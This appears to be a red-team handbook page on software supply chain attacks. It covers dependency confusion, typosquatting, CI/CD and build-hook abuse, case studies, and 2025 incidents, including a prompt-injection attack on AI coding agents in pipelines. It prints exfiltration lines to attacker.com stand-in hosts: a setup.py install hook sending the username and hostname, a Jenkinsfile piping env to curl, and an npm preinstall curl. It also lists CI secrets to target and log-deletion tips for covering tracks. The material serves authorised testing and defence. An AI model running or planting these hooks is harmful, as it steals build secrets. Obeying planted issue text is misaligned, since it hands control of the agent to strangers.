# Supply Chain Attacks

> **MITRE ATT&CK**: Initial Access > T1195 - Supply Chain Compromise
> **Platforms**: All (development environments, build systems, package managers)
> **Required Privileges**: Varies (none for dependency confusion; elevated for CI/CD)
> **OPSEC Risk**: Low-Medium (simulated in engagements; actual supply chain compromise is rare in red teaming)

## Strategic Overview

Supply chain attacks represent a paradigm shift in offensive operations: instead of
attacking the target directly, you compromise something the target trusts. The SolarWinds
compromise (2020), Kaseya VSA attack (2021), and the 3CX supply chain attack (2023)
demonstrated that a single compromised build pipeline can provide access to thousands of
organizations simultaneously. For the Red Team Lead, supply chain attack simulation is an
increasingly important engagement deliverable. Most organizations have no visibility into
their software supply chain dependencies, making them unable to detect dependency confusion,
typosquatting, or CI/CD pipeline compromise. Red teams typically simulate these attacks
rather than actually compromising upstream suppliers -- the goal is to demonstrate the
risk and validate detection capabilities. Dependency confusion attacks, where an attacker
publishes a malicious package with the same name as an internal package on a public
registry, are the most commonly executed supply chain technique in red team engagements
because they can be performed safely and provide clear evidence of risk.

## Technical Deep-Dive

### Dependency Confusion

```bash
# Concept: Internal packages (private registries) vs public packages (npm, PyPI, NuGet)
# If an internal package "target-utils" exists but is not on the public registry,
# an attacker publishes "target-utils" on the public registry with a higher version number.
# Package managers may prefer the public (higher version) package over the internal one.

# Step 1: Identify internal package names
# - JavaScript: package.json with scoped (@target/) or unscoped internal packages
# - Python: requirements.txt, setup.py, Pipfile with internal package names
# - .NET: packages.config, .csproj with NuGet package references
# Sources: GitHub repos, job postings, error messages, exposed build logs

# Step 2: Check if the package name exists on the public registry
# npm
npm view target-internal-utils 2>&1 | grep "404"    # 404 = name available

# PyPI
pip install target-internal-utils 2>&1 | grep "No matching distribution"

# NuGet
nuget search target-internal-utils

# Step 3: Create a proof-of-concept package (SAFE for red team)
# Python setup.py with DNS callback (no malicious code)
```

```python
# Example: Safe dependency confusion PoC (Python)
# setup.py for PyPI package "target-internal-utils"
from setuptools import setup
from setuptools.command.install import install
import socket, os

class PostInstall(install):
    def run(self):
        # Safe callback - DNS only, no code execution
        hostname = f"{os.environ.get('USER','unknown')}.{socket.getfqdn()}.dep-confusion.attacker.com"
        try:
            socket.getaddrinfo(hostname, 80)
        except:
            pass
        install.run(self)

setup(
    name='target-internal-utils',
    version='99.0.0',          # Higher than any internal version
    cmdclass={'install': PostInstall},
    description='Internal utilities',
)
```

```bash
# Step 4: Publish to public registry
# python3 -m twine upload dist/*     # PyPI
# npm publish                         # npm
# dotnet nuget push package.nupkg     # NuGet

# Step 5: Monitor for DNS callbacks
# Any callback proves the target's build system pulled the public package
# Log: timestamp, source IP, hostname (reveals username and system FQDN)

# IMPORTANT: Coordinate with client before publishing packages
# Use only safe callbacks (DNS, HTTP GET) - never execute malicious code
# Remove packages from public registries after engagement
```

### Typosquatting

```bash
# Register package names that are common misspellings of popular packages
# Examples:
# "reqeusts" instead of "requests" (Python)
# "lodsah" instead of "lodash" (JavaScript)
# "coloers" instead of "colors" (JavaScript)

# For red team engagements, typosquatting targets internal package names:
# "target-utlis" instead of "target-utils"
# "target_uitls" instead of "target_utils" (underscore vs hyphen confusion)

# Package namespace confusion:
# npm scoped packages: @target/utils vs target-utils (unscoped)
# Python: target-utils vs target_utils (PEP 503 normalizes these, but edge cases exist)
```

### CI/CD Pipeline Compromise

```bash
# CI/CD pipelines are high-value targets: they have code access, secrets, and deploy permissions

# GitHub Actions - poisoned workflow
# If a target repo accepts PRs from forks, attacker can:
# 1. Fork the repository
# 2. Modify .github/workflows/ to exfiltrate secrets
# 3. Submit a pull request (triggers workflow on pull_request_target)

# Jenkinsfile manipulation (if Jenkins uses SCM-stored pipelines)
# Modify Jenkinsfile in a branch to exfiltrate environment variables
# pipeline { stages { stage('Build') { steps { sh 'env | curl -X POST -d @- https://attacker.com/exfil' }}}}

# GitLab CI - .gitlab-ci.yml manipulation
# Similar to Jenkins: modify CI config to exfiltrate secrets during build

# Common CI/CD secrets to target:
# - AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY
# - AZURE_CLIENT_SECRET
# - DOCKER_PASSWORD / DOCKER_REGISTRY_TOKEN
# - NPM_TOKEN / PYPI_TOKEN
# - SSH private keys for deployment
# - Database connection strings

# Red team simulation approach:
# 1. Identify CI/CD platform from repo structure or job postings
# 2. Assess whether pipeline configurations are stored in SCM
# 3. Determine if PRs trigger pipelines with access to secrets
# 4. Document findings without actually exfiltrating production secrets
```

### Build System Exploitation

```bash
# Compromising build tools and compilers

# Malicious pre/post-build scripts
# npm: package.json "preinstall" / "postinstall" scripts
{
  "name": "target-package",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "curl https://attacker.com/callback?host=$(hostname)"
  }
}

# Python: setup.py install hooks (shown in dependency confusion section)
# .NET: MSBuild tasks and targets can execute arbitrary code during build
# Make: Makefile targets can contain arbitrary shell commands

# Container image poisoning
# If target pulls base images from public registries without verification:
# 1. Identify base images used (FROM statements in Dockerfiles)
# 2. Publish modified images with subtle backdoors
# 3. Wait for target to rebuild containers using poisoned base image
# Red team simulation: demonstrate the risk without actually poisoning images
```

### Notable Case Studies

```
# SolarWinds Orion (2020) - SUNBURST
# - Threat actor: APT29 (Cozy Bear / Russian SVR)
# - Vector: Compromised SolarWinds build pipeline
# - Payload: Malicious DLL in Orion software update
# - Impact: ~18,000 organizations installed trojanized update
# - Dwell time: ~14 months before detection
# - Key lesson: Trusted software updates bypass all perimeter defenses

# Kaseya VSA (2021) - REvil Ransomware
# - Vector: Exploited zero-day in Kaseya VSA server (managed service provider tool)
# - Impact: 1,500+ businesses affected through MSP trust relationships
# - Key lesson: MSP compromise = mass compromise of downstream clients

# 3CX Desktop App (2023) - Supply Chain within Supply Chain
# - Vector: 3CX developer machine compromised via trojanized X_TRADER app
# - Payload: Signed 3CX installer contained backdoor DLL
# - Impact: 600,000+ organizations use 3CX
# - Key lesson: Supply chain attacks can cascade (supply chain of a supply chain)

# Codecov Bash Uploader (2021)
# - Vector: Modified bash script in Codecov's CI integration
# - Payload: Exfiltrated environment variables (CI/CD secrets) to attacker server
# - Impact: Secrets exposed from hundreds of private repositories
# - Key lesson: Even simple CI scripts are attack vectors

# Key takeaways:
# 1. Prevention requires verified signatures, pinned dependencies, SBOM
# 2. Detection requires build pipeline monitoring and integrity verification
# 3. Red teams simulate these to validate organizational readiness
```

### Safe Simulation Techniques for Engagements

```bash
# Red team supply chain simulation framework:

# 1. Dependency Confusion (SAFE):
#    - Publish packages with DNS-only callbacks
#    - Remove packages immediately after test window
#    - Coordinate timing with client security team
#    - Document: which systems resolved the package, build system details

# 2. CI/CD Assessment (SAFE):
#    - Review pipeline configurations for secret exposure risks
#    - Test whether PRs from forks trigger privileged workflows
#    - Verify build artifact signing and integrity checks
#    - Document: gaps without exploiting them

# 3. Software Bill of Materials (SBOM) validation:
#    - Generate SBOM for target applications
#    - Cross-reference dependencies against known vulnerabilities
#    - Identify dependencies with no pinned versions (floating versions)
#    - Document: update hygiene and risk exposure

# 4. Package integrity verification:
#    - Check if target verifies package checksums/signatures
#    - Test if target accepts packages from multiple registries
#    - Verify registry configuration priority (internal vs public)
#    - Document: configuration gaps enabling dependency confusion
```

## Detection & Evasion

### What Defenders See
- Package manager logs showing unexpected package installations from public registries
- CI/CD pipeline logs with modified workflow configurations
- Network traffic to unexpected domains during build processes
- New or modified packages in internal artifact repositories
- Build artifact hash mismatches compared to expected values

### Detection Capabilities Organizations Should Have
- Registry configuration that prioritizes internal packages (namespace scoping)
- CI/CD pipeline integrity monitoring (workflow file change detection)
- SBOM generation and continuous dependency vulnerability scanning
- Build artifact signing and verification (Sigstore, cosign)
- Network monitoring for unexpected outbound connections from build servers

### OPSEC Considerations for Red Teams
- Always coordinate supply chain simulations with client stakeholders
- Use only safe callbacks (DNS lookups, HTTP GETs to controlled infrastructure)
- Never execute malicious code on production build systems without explicit approval
- Remove all published packages from public registries immediately after testing
- Document the full simulation timeline for legal and compliance review

## 2025 Techniques

### tj-actions/changed-files Supply Chain Compromise (CVE-2025-30066)

```
# Largest GitHub Actions supply chain attack to date (March 2025)
# MITRE: T1195.002 / T1552
# Impacted 23,000+ repositories

# Attack chain:
# 1. Attacker compromised a GitHub PAT used by a bot with repo access
# 2. Modified multiple version tags to reference a malicious commit
# 3. Compromised action dumped CI runner memory
# 4. Secrets extracted: AWS access keys, GitHub PATs, npm tokens,
#    private RSA keys -- double-encoded as base64 in workflow logs

# Initially targeted at Coinbase, then expanded to all 23K+ repos
# Patched in v46.0.1
# CISA alert issued March 18, 2025

# Red team simulation:
# 1. Identify GitHub Actions used by target from .github/workflows/
# 2. Check if actions are pinned to commit hash vs tag
# 3. Demonstrate risk: tag-based references can be retroactively modified
# 4. Document: tag-pinned vs hash-pinned action usage ratio

# Defensive mitigation:
# Pin all GitHub Actions to specific commit SHA, not tags
# Use GitHub's dependency graph to audit action dependencies
# Monitor workflow logs for unexpected base64 output patterns
```

### PromptPwnd -- AI Agent Prompt Injection in CI/CD Pipelines

```
# New attack class (Aikido Security, 2025)
# MITRE: T1195.002 / T1059
# Bridges AI and CI/CD attack surfaces

# Concept: AI coding agents in CI/CD pipelines are exploited via
# prompt injection in untrusted user-controlled strings

# Attack vectors:
# - Issue bodies on public repositories
# - Pull request descriptions and commit messages
# - Code comments and documentation
# - Any user-controlled text processed by AI agents

# Vulnerable AI agents confirmed:
# - Gemini CLI (Google -- own repo was affected, patched in 4 days)
# - Claude Code Actions
# - OpenAI Codex Actions
# - GitHub AI Inference

# Impact: At least 5 Fortune 500 companies confirmed affected
# An attacker can simply open an issue on a public repo with hidden
# instructions that the AI agent interprets as legitimate commands

# Red team application:
# Test if target uses AI agents in CI/CD (check workflow files)
# Craft benign prompt injection PoC in issue/PR to demonstrate risk
# Document: which pipelines process untrusted input through AI agents
```

### CodeBreach -- AWS CodeBuild Supply Chain Vulnerability

```
# Wiz Research (August-September 2025)
# MITRE: T1195.002
# Critical misconfiguration in AWS CodeBuild webhook filters

# Vulnerability: Missing regex anchors (^ and $) in ACTOR_ID filters
# Any GitHub user ID that was a SUPERSTRING of an approved ID
# could bypass the filter and trigger builds

# Potential impact:
# - Complete takeover of AWS's own GitHub repositories
# - Including the AWS JavaScript SDK
# - 66% of cloud environments include the JS SDK
# - AWS Console itself depends on it
# - Platform-wide compromise was theoretically possible

# Fixed by AWS in September 2025
# Demonstrates how regex errors in CI/CD create catastrophic risk

# Red team lesson:
# Audit webhook filter regex patterns in CI/CD pipelines
# Test for missing anchors in actor/branch/tag filters
```

### Salesloft/Drift OAuth Token Supply Chain (UNC6395)

```
# One of the most significant SaaS supply-chain breaches to date
# MITRE: T1199 / T1528 / T1567
# March-August 2025 -- 700+ organizations compromised

# Attack chain:
# 1. March-June 2025: Compromised Salesloft's GitHub account
# 2. June-August 2025: Pivoted to Drift's AWS environment
# 3. Harvested OAuth tokens (Drift integrates with Salesforce, Slack, etc.)
# 4. August 8-18: Exfiltrated data from 700+ Salesforce instances
# 5. August 9: Accessed Gmail accounts via stolen OAuth tokens

# Data exposed: Names, emails, phone numbers, support cases,
#               AWS keys, Snowflake tokens

# Impact: Single SaaS vendor compromise cascaded to 700+ organizations
# across multiple SaaS platforms (Salesforce, Google Workspace, Slack)

# Red team application:
# Map SaaS-to-SaaS OAuth connections in target environment
# Identify SaaS vendors with excessive delegated permissions
# Demonstrate cascading risk through vendor trust chains
```

### s1ngularity Developer Supply Chain Campaign

```
# Coordinated supply chain attack via compromised Nx packages
# MITRE: T1195.001 / T1552
# August-November 2025

# Harvested 2,349 credentials from 1,079 developer systems
# Part of broader pattern of targeting developer toolchains
# Developer machines often have cloud access credentials

# Red team application:
# Assess dependency pinning and integrity verification in build systems
# Test internal package registry isolation from public registries
```

### Azure DevOps to Self-Hosted Agent Reverse Shell

```
# Attack path: Azure DevOps pipeline to self-hosted on-premises agent
# Source: White Knight Labs (July 15, 2025)
# MITRE: T1199 / T1059

# Exploits improperly secured Azure DevOps pipelines to execute
# malicious code on self-hosted on-premises agents

# Attack chain:
# 1. Attacker obtains compromised credentials for Azure DevOps portal
# 2. Creates a custom pipeline pointing to a malicious GitHub repository
# 3. Pipeline executes on self-hosted agent (on-premises infrastructure)
# 4. Achieves reverse shell on the underlying on-premises host

# Impact: Creates a direct path from cloud environments to internal
# infrastructure -- a cloud-to-on-prem pivot via CI/CD
# Self-hosted agents often run with elevated privileges on internal networks

# Red team application:
# Identify organizations using self-hosted Azure DevOps agents
# Test pipeline creation permissions and repository linking controls
# Demonstrate cloud-to-on-prem lateral movement via CI/CD abuse
```

### GitHub PAT to Cloud Control Plane Attack Chain

```
# Wiz Research (2025)
# MITRE: T1552.001 / T1078.004
# Demonstrates cross-cloud lateral movement from GitHub to CSP control planes

# Key findings:
# - 45% of organizations have plain-text cloud keys in PRIVATE repos
#   (vs 8% in public repos)
# - Private repos create a false sense of security for secret storage

# PAT with read access exploitation:
# - GitHub API code search discovers secret names in YAML files
# - These API calls are NOT logged -- invisible to defenders
# - Enables silent enumeration of cloud credentials across repositories

# PAT with write scope exploitation:
# - Delete workflow logs to remove evidence of malicious pipeline runs
# - Delete workflow runs, PRs, and branches to cover tracks
# - Since workflow logs are rarely streamed to SIEMs,
#   this enables near-complete evidence destruction

# Red team application:
# Assess GitHub PAT scope hygiene in target organization
# Test whether cloud keys exist in private repositories
# Demonstrate API-based secret enumeration without triggering logs
# Document: audit log gaps in GitHub API code search operations
```

### SaaS-to-SaaS Supply Chain Threat Landscape

```
# Emerging risk surface from interconnected SaaS platforms
# Source: Valence Security (2025)
# MITRE: T1199 / T1528

# Key risk factors:
# - Over-privileged API integrations between SaaS platforms
# - Shadow OAuth tokens created outside IT governance
# - Ungoverned automated workflows (e.g., Zapier, Power Automate, n8n)

# The interconnected "business application mesh" creates fourth-party risk
# through SaaS-to-SaaS connections -- a compromise in one SaaS vendor
# cascades through OAuth trust chains to connected platforms

# Parallels the Salesloft/Drift breach (UNC6395) pattern
# where a single vendor compromise cascaded to 700+ organizations

# Red team application:
# Map SaaS-to-SaaS OAuth integration graph in target environment
# Identify over-privileged API tokens and shadow integrations
# Assess automated workflow platforms for ungoverned connections
# Document: fourth-party risk exposure through SaaS trust chains
```

### Jaguar Land Rover Supply Chain Attack

```
# Most economically damaging cyber incident in UK history (August 2025)
# Source: Integrity360 / Multiple news sources
# MITRE: T1199

# Impact: GBP 1.9 billion in economic damage
# Production halted for five weeks across manufacturing operations

# Demonstrated how shared vendors and cloud integrations expose
# entire sectors to single points of failure
# Automotive supply chain dependencies amplified blast radius

# Red team lesson:
# Assess third-party vendor concentration risk in target organization
# Map shared vendor dependencies across business-critical operations
# Demonstrate single-point-of-failure scenarios in supply chain architecture
# Document: vendor dependency concentration and cascading risk potential
```

## Cross-References

- **Passive Recon** (01-reconnaissance/passive-recon.md) -- GitHub recon reveals internal package names
- **Web Recon** (01-reconnaissance/web-recon.md) -- exposed build logs reveal CI/CD configuration
- **Trusted Relationships** (02-initial-access/trusted-relationships.md) -- MSP/vendor supply chain overlap
- **Cloud Recon** (01-reconnaissance/cloud-recon.md) -- cloud-hosted build systems and registries

## References

- MITRE ATT&CK T1195: https://attack.mitre.org/techniques/T1195/
- Dependency Confusion Research: https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
- SLSA Framework: https://slsa.dev/
- Sigstore: https://www.sigstore.dev/
- in-toto: https://in-toto.io/
- OWASP Software Component Verification Standard: https://owasp.org/www-project-software-component-verification-standard/
- SolarWinds Analysis: https://www.mandiant.com/resources/sunburst-additional-technical-details
- tj-actions CVE-2025-30066: https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-github-action
- PromptPwnd: https://www.aikido.dev/blog/promptpwnd
- CodeBreach: https://www.wiz.io/blog/codebreach
- Salesloft/Drift Breach: https://cloud.google.com/blog/topics/threat-intelligence/unc6395-supply-chain/
